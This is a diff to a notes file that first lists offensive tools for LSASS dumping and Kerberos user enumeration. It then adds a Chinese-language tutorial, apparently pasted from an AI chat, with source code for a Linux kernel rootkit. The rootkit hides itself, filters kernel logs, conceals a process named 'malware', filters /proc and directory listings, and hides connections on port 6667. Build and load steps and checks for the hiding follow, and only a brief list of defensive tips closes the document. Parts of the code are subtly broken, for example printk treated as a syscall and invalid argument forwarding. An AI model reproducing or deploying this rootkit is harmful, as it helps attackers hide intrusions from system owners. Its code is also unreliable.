@@ -4,3 +4,189 @@ https://github.com/Offensive-Panda/ShadowDumper/releases/download/LsassDumpingV2
 https://github.com/ropnop/kerbrute
 auxiliary/gather/kerberos_enumusers
 https://github.com/3gstudent/pyKerbrute
+
+一、内核模块自隐藏实现
+1. ​模块链表摘除与sysfs清理
+c
+复制
+#include <linux/module.h>
+#include <linux/kobject.h>
+#include <linux/vmalloc.h>
+
+static void hide_module_self(void) {
+    struct vmap_area *va, *tmp;
+    struct list_head *vmap_list = (struct list_head*)kallsyms_lookup_name("vmap_area_list");
+    struct rb_root *vmap_root = (struct rb_root*)kallsyms_lookup_name("vmap_area_root");
+    
+    // 从vmap_area链表移除模块内存痕迹
+    list_for_each_entry_safe(va, tmp, vmap_list, list) {
+        if ((void*)THIS_MODULE >= va->va_start && (void*)THIS_MODULE <= va->va_end) {
+            list_del(&va->list);
+            rb_erase(&va->rb_node, vmap_root);
+        }
+    }
+    
+    // 从全局模块链表摘除[3,6](@ref)
+    list_del_init(&THIS_MODULE->list);
+    
+    // 清除sysfs中的模块节点
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+2. ​日志输出拦截
+c
+复制
+static asmlinkage int (*orig_printk)(const char *fmt, ...);
+
+static asmlinkage int hacked_printk(const char *fmt, ...) {
+    if (strstr(fmt, THIS_MODULE->name)) 
+        return 0;  // 过滤含模块名的日志
+    return orig_printk(fmt, ...);
+}
+
+static void hook_logging(void) {
+    orig_printk = (void*)kallsyms_lookup_name("printk");
+    sys_call_table[__NR_printk] = (unsigned long)hacked_printk;
+}
+​二、进程隐藏实现
+1. ​task_struct链表脱链
+c
+复制
+#include <linux/sched.h>
+#include <linux/proc_fs.h>
+
+static void hide_process_by_name(const char *name) {
+    struct task_struct *p;
+    rcu_read_lock();
+    for_each_process(p) {
+        if (strcmp(p->comm, name) == 0) {
+            list_del(&p->tasks);       // 全局进程链表脱链[1](@ref)
+            INIT_LIST_HEAD(&p->tasks); // 防止内核panic
+            p->parent = p;             // 隔离进程树关系
+            p->real_parent = p;
+        }
+    }
+    rcu_read_unlock();
+}
+2. ​procfs过滤
+c
+复制
+static struct file_operations *proc_fops;
+static int (*orig_filldir)(void *, const char *, int, loff_t, u64, unsigned);
+
+int hacked_filldir(void *buf, const char *name, int namelen, ...) {
+    struct task_struct *p;
+    int pid;
+    
+    if (sscanf(name, "%d", &pid) == 1) {
+        rcu_read_lock();
+        p = pid_task(find_pid_ns(pid, &init_pid_ns), PIDTYPE_PID);
+        if (p && strcmp(p->comm, TARGET_PROC_NAME) == 0) {
+            rcu_read_unlock();
+            return 0;  // 过滤目标进程的PID目录[7](@ref)
+        }
+        rcu_read_unlock();
+    }
+    return orig_filldir(buf, name, namelen, ...);
+}
+
+static void hook_procfs(void) {
+    struct proc_dir_entry *pde = proc_pde_lookup(&init_pid_ns.proc_inum, 0);
+    proc_fops = (struct file_operations *)pde->proc_fops;
+    orig_filldir = proc_fops->iterate_shared;
+    proc_fops->iterate_shared = hacked_filldir;
+}
+​三、模块文件隐藏
+c
+复制
+#include <linux/fs.h>
+
+static int (*orig_readdir)(struct file *, struct dir_context *);
+
+int hacked_readdir(struct file *file, struct dir_context *ctx) {
+    struct dir_context *act = ctx;
+    act->actor = hacked_filldir;  // 复用procfs过滤逻辑
+    return orig_readdir(file, ctx);
+}
+
+static void hook_vfs(void) {
+    struct file_operations *f_op = filp->f_op;
+    orig_readdir = f_op->iterate_shared;
+    f_op->iterate_shared = hacked_readdir;
+}
+​四、网络连接隐藏
+c
+复制
+#include <net/tcp.h>
+#include <linux/seq_file.h>
+
+static int (*orig_tcp_show)(struct seq_file *, void *);
+
+int hacked_tcp_show(struct seq_file *seq, void *v) {
+    struct sock *sk = (struct sock *)v;
+    if (sk->sk_num == htons(TARGET_PORT)) 
+        return 0;  // 过滤目标端口连接[6](@ref)
+    return orig_tcp_show(seq, v);
+}
+
+static void hook_network(void) {
+    orig_tcp_show = (void*)kallsyms_lookup_name("tcp4_seq_show");
+    sys_call_table[__NR_tcp4_seq_show] = (unsigned long)hacked_tcp_show;
+}
+​五、完整模块代码整合
+c
+复制
+#define TARGET_PROC_NAME "malware"  // 要隐藏的进程名
+#define TARGET_PORT 6667           // 要隐藏的端口
+
+static int __init rootkit_init(void) {
+    hide_module_self();     // 模块自隐藏
+    hook_logging();         // 日志拦截
+    hide_process_by_name(TARGET_PROC_NAME);  // 进程隐藏
+    hook_procfs();          // /proc过滤
+    hook_vfs();             // 文件隐藏
+    hook_network();         // 网络连接隐藏
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {
+    // 恢复所有Hook（需保存原始指针）
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+MODULE_LICENSE("GPL");
+​六、编译与加载流程
+​Makefile配置：
+makefile
+复制
+obj-m += rootkit.o
+KDIR := /lib/modules/$(shell uname -r)/build
+
+all:
+    make -C $(KDIR) M=$(PWD) modules
+
+clean:
+    make -C $(KDIR) M=$(PWD) clean
+​加载命令：
+bash
+复制
+sudo insmod rootkit.ko  # 加载后自动隐藏
+​七、验证与防御绕过
+​模块隐藏验证：
+lsmod | grep rootkit → 无输出
+grep rootkit /proc/modules → 无匹配项
+​进程隐藏验证：
+ps aux | grep malware → 无输出
+检查/proc/[PID]/comm → 目标PID不存在
+​网络连接隐藏：
+netstat -antp | grep 6667 → 无结果
+检查/proc/net/tcp → 目标端口无条目
+​日志完整性：
+dmesg | grep rootkit → 无输出（printk拦截生效）
+​关键防御要点
+​内核保护配置：
+启用Secure Boot和模块签名验证（需绕过需硬件级攻击）
+设置/sys/module目录权限为700，防止非root用户探测
+​日志加固：
+使用chattr +a /var/log/messages防止日志被篡改
+启用syslog-ng的完整性校验功能
